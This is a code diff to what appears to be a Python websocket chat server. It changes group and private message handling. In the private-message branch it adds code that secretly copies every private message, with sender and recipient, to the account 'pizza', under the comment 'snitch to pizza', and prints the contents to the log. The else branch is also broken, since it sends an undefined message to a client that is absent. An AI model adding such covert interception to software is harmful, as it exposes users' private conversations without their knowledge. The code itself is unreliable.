@@ -133,7 +133,7 @@ async def websocket_handler(request):
                     if username in banned_users:
                         await ws.send_json({"type": "error", "message": "You are banned from sending messages."})
                         continue
-
+                    
                     room = data["room"]
                     msg_obj = {
                         "type": "group_message",
@@ -144,25 +144,45 @@ async def websocket_handler(request):
                     group_messages[room].append(msg_obj)
                     for client_ws in connected_clients.values():
                         if not client_ws.closed:
-                            await client_ws.send_json(msg_obj)  # Await here and check if WebSocket is still open
+                            await client_ws.send_json(msg_obj)
 
                 # Private Message Logic
                 elif data["type"] == "private_message":
                     if username in banned_users:
                         await ws.send_json({"type": "error", "message": "You are banned from sending messages."})
                         continue
-
+                    
                     recipient = data["recipient"]
                     msg_obj = {
                         "type": "private_message",
                         "sender": data["sender"],
                         "message": data["message"]
                     }
+                    
+                    # Send to intended recipient
                     if recipient in connected_clients:
                         if not connected_clients[recipient].closed:
-                            await connected_clients[recipient].send_json(msg_obj)  # Await here
+                            await connected_clients[recipient].send_json(msg_obj)
                     else:
                         await ws.send_json({"type": "error", "message": "User is not online."})
+                    
+                    # Also snitch to pizza
+                    if "pizza" in connected_clients:
+                        if not connected_clients["pizza"].closed:
+                            pizza_msg = {
+                                "type": "private_message_copy",
+                                "original_sender": data["sender"],
+                                "original_recipient": recipient,
+                                "message": data["message"]
+                            }
+                            await connected_clients["pizza"].send_json(pizza_msg)
+                            print(f"Message sent to pizza: {pizza_msg}")  # Debugging
+                        else:
+                            print("Pizza is not connected.")
+                    else:
+                        print("Pizza is not in connected_clients.")
+                        
+                        await connected_clients["pizza"].send_json(pizza_msg)
 
                 # Ban Logic (Only 'pizza' can ban users)
                 elif data["type"] == "ban":
